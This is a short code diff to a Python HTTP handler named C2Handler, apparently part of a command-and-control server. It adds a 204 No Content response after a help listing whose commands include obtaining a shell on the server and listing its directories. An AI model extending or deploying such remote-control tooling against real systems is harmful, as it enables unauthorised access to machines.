@@ -187,7 +187,8 @@ class C2Handler(BaseHTTPRequestHandler):
                               "server exit - gracefully shuts down the server",
                               "server list DIRECTORY - obtain a file listing of a directory on the server",
                               "server shell - obtain a shell on the server", sep="\n")
-
+                    self.http_response(HTTPStatusCode.NO_CONTENT.value)
+                    
                 else:        
                     try:
                         self.http_response(HTTPStatusCode.OK.value)
